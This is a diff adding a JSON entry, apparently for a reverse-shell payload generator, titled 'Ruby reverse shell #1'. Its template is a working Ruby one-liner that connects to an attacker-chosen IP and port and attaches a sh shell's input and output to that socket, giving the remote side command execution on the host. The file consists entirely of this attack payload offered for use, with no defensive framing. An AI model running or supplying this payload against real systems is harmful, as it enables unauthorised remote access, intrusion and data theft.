@@ -1,0 +1,9 @@
+{
+  "commands": [
+    {
+      "title": "Ruby reverse shell #1",
+      "template": "ruby -rsocket -e 'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"{ip}\",{port}))'",
+      "description": "Basic Ruby reverse shell with sh spawned."
+    }
+  ]
+}
